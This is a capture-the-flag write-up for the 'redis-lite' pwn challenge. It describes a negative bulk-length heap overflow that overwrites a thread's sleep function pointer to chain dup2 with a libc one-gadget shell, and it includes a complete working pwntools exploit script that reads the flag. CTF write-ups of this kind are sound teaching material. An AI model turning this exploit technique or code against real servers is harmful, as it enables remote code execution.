# redis-lite writeup

Team: Super HexaGoN (Super Guesser + KAIST GoN)

Chal solved together with procfs :+1:


## Analysis

A "lite Redis" Key-Value DB which follows [RESP](https://redis.io/topics/protocol).

Vulnerability exists in `resp_receive_bulk` where sending bulk string of length -3 will result in overflow, i.e. receives infinite byte-by-byte input in a `calloc(1, 0)` buffer.

A good article about exploiting such "wildcopy" vulns: [Taming the wild copy: Parallel Thread Corruption](https://googleprojectzero.blogspot.com/2015/03/taming-wild-copy-parallel-thread.html?m=1) by Project Zero


## Exploit

The vulnerability is usually unexploitable in a single-thread program, but in this case we have threads running in the background for key expiration. Thus the exploit plan is simple: let the buffer be allocated in an address lower than struct passed to expiration handlers, then do the infinite OOB to overwrite sleep fptr as well as unit for edi-control.

I always love to smash oneshots in my exploits, so checking the register state at the time of calling `(u)sleep` revealed that `rsi == rdx == NULL`, great for the oneshot below:

```
0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Okay Xion, but you can't just pop shell on a forkserver talking through a socket!

Remember oneshot constraint **`rsi == NULL`**? And how we can control edi by overwriting `unit` field of the expiration handler struct?

Great! This lets us call `dup2(4, 0)` where 4 is our connection sockfd. Call this first, followed by oneshot and BOOM! We popped shell! Just `cat /flag* >&0` to pop flag (the redirection is necessary, fd 1 is currently server's stdout). A lunatic solution for a lunatic pwn chal :)


## Solver Code

```python
#!/usr/bin/env python3

from pwn import *

LOCAL = False

libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')


def resp_bulk_string(data, length=None):
    if length == None:
        length = len(data)
    return b"$" + str(length).encode() + b"\r\n" + data + b"\r\n"


def resp_bulk_string_2(data, length):
    return b"$" + str(length).encode() + b"\r\n" + data


def resp_array(elements):
    return b"*" + str(len(elements)).encode() + b"\r\n" + b"".join([x for x in elements])


def set_elem(key, value):
    command = []
    command.append(resp_bulk_string(b"SET"))
    command.append(resp_bulk_string(key))
    command.append(resp_bulk_string(value))
    p.send(resp_array(command))


def set_elem_with_expiration(key, value, ex_type, timeout):
    command = []
    command.append(resp_bulk_string(b"SET"))
    command.append(resp_bulk_string(key))
    command.append(resp_bulk_string(value))
    command.append(resp_bulk_string(ex_type))
    command.append(resp_bulk_string(str(timeout).encode()))
    p.send(resp_array(command))


def spawn():
    global p
    if LOCAL:
        p = remote("127.0.0.1", 6379)
    else:
        p = remote("pwn1.ctf.zer0pts.com", 6379)


def brute(vals):
    spawn()
    for i in range(10):
        set_elem_with_expiration(b"a"*8, b"b"*8, b"PX", 1000000)
    for i in range(10):
        set_elem_with_expiration(b"a"*8, b"b"*8, b"PX", 100000000)
    # some awesome heap stuff

    payload = b""
    payload += b"\x00"*0x270
    payload += bytes(vals)

    p.send(resp_bulk_string_2(payload, -3))
    
    try:
        st = time.time()
        while True:
            et = time.time()
            if et-st > 2:
                return True
            p.recv(timeout=0.1)
    except EOFError:
        return False
    finally:
        p.close()


def exploit():
    spawn()
    for i in range(10):
        set_elem_with_expiration(b"a"*8, b"b"*8, b"PX", 1000000)
    for i in range(10):
        set_elem_with_expiration(b"a"*8, b"b"*8, b"PX", 100000000)
    # some awesome heap stuff

    payload = b"\x00"*0x270
    payload += p64(libc.sym['dup2']) + p32(0x4) + p32(0x7fffffff) + p64(0)

    p.send(resp_bulk_string_2(payload, -3))
    sleep(0.5)

    payload = b"\x00"*0x198
    payload += p64(libc.address + 0xe3b34) + p32(0) + p32(0x7fffffff) + p64(0)
    p.send(payload)


if __name__ == "__main__":
    # step 1. leak
    '''
    usleep = [0x40] #0x840
    for i in range(0x8, 0xf8+1, 0x10):
        if brute(usleep + [i]):
            usleep.append(i)
            print(usleep)
            break
    else:
        assert False
    for ct in range(4):
        for i in range(0, 0x100, 1):
            print(ct, i)
            if brute(usleep + [i]):
                usleep.append(i)
                print(usleep)
                break
        else:
            assert False
    
    usleep = u64(bytes(usleep) + b'\0\0')
    libc.address = usleep - libc.sym['usleep']
    '''
    libc.address = 0x7f2c10bc1000
    assert libc.address & 0xfff == 0
    log.success(f'{libc.address = :#014x}')

    # step 2. dup2 & rce
    exploit()
    p.sendline('cat /flag* >&0')
    p.interactive()
```
